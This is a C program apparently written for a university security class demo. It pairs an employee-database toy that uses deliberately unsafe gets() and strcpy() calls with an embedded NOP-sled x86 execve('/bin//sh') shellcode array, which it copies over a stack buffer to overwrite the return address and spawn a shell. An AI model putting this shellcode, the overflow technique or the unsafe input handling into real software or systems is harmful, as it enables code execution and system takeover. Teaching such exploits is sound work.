/* Mason Pitcher Michael Schmitt ECE498 Spring 2024
 * Vulnerable Program
 *
 * This will take user input and save "employee" info into the "database"
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

char attack[160] = {
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x31, 0xc0,
0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3,
0x50, 0x53, 0x89, 0xe1, 0x31, 0xd2, 0x31, 0xc0, 0xb0, 0x0b, 0xcd, 0x80, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x96, 0xce, 0xff, 0xff, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x90, 0x90, 0x90, 0x90
};

//0xed, 0x65, 0x55, 0x56,

struct Employee {
	char name[48];
	int id;
	int hours_worked;
};

void add_new_employee(struct Employee *database, int employee_count,
			int stack, char* attack);
void bof(char *attack);
int add_employee_hours(struct Employee *database);
void wait_for_enter(void);

void wait_for_enter(void)
{
	printf("Press <enter> to continue...");
	while(getchar() != '\n') {}
}

void add_new_employee(struct Employee *database, int employee_count,
			int stack, char* attack)
{
	char name_input[100];

	printf("enter employee name: ");
	gets(name_input);

	printf("ret addr: %p\n", __builtin_return_address(0));
	printf("frame addr: %p\n", __builtin_frame_address(0));
	printf("buffer[0] addr: %p\n", &name_input[0]);

	if (stack) {
		for (int i = 159; i>=0; i--) {
			printf("name_input[%03d] @%p: %8x (%c) \tattack[%03d]: %8x (%c)\n",
				i, &name_input[i], name_input[i],
				(isgraph(name_input[i]) ? name_input[i] : ' ' ), 
				i, attack[i],
				(isgraph(attack[i]) ? attack[i] : ' ' ));
		}
		printf("\n\nbefore attack:\n\tfucntion return address: %p\n", __builtin_return_address(0));
		strncpy(name_input, attack, 160);
		printf("after attack:\n\tfunction return address: %p\n\n", __builtin_return_address(0));
		wait_for_enter();
	} else {
		database[employee_count].id = employee_count+1;
		database[employee_count].hours_worked = 0;
		strcpy(database[employee_count].name, name_input);
	}


	printf("welcome to work, %s! :3\n", name_input);
	
	return;	
}

int add_employee_hours(struct Employee *database) {
	char id_input[10];
	char hours_input[10];

	printf("enter employee id: ");
	gets(id_input);

	printf("how many hours today?: ");
	gets(hours_input);
	
	database[atoi(id_input)-1].hours_worked += atoi(hours_input);
	printf("total hours for %s: %d\n",
		database[atoi(id_input)-1].name,
		database[atoi(id_input)-1].hours_worked);

	return 0;
}

int main(void) {
	int i;
	int count;
	struct Employee database[10];
	printf("main ret addr: %p\n", __builtin_return_address(0));

	/****************** begin benign program ****************************/
	count = 0;
	while (count < 3) {
		add_new_employee(database, count, 0, attack);
		count += 1;
	}

	printf("employees: \n");
	for (i = 0; i<3; ++i) {
		printf("%d: %s\n", database[i].id, database[i].name);
	}

	printf("\n --- Time to enter hours :) ---\n");
	for (i = 0; i<3; i++) {
		add_employee_hours(database);
	}
	wait_for_enter();
	/****************** end benign program ****************************/

	/* explain why the code is dangerous */
	printf("");
	wait_for_enter();

	/* show truncated version of vulnerability */
	printf("");
	printf(
		"\n\nvoid add_new_employee(struct Employee *database, int employee_count)\n"
		"{\n"
			"\tchar name_input[100];\n\n"

			"\tprintf(\"enter employee name: \");\n"
			"\tgets(name_input);     <---------------------------- VERY BAD\n\n"

			"\tdatabase[employee_count].id = employee_count+1;\n"
			"\tdatabase[employee_count].hours_worked = 0;\n"
			"\tstrcpy(database[employee_count].name, name_input);\n\n"

			"\tprintf(\"welcome to work, \\%%s! :3\\n\", name_input);\n\n"
			
			"\treturn;\n"
		"}\n\n"
	);
	wait_for_enter();

	/* explain why the code is dangerous, including which safety features
	 * need to be disabled */
	printf("");

	/* print buffer diagram of "before attack" */
	printf("");

	/* show shellcode (compilation process/disassemble, plus actual bytes) */
	printf("");

	/* print buffer diagram of "after attack" */
	printf("");

	/* root shell */
	add_new_employee(database, count, 1, attack);

	return 0;
}
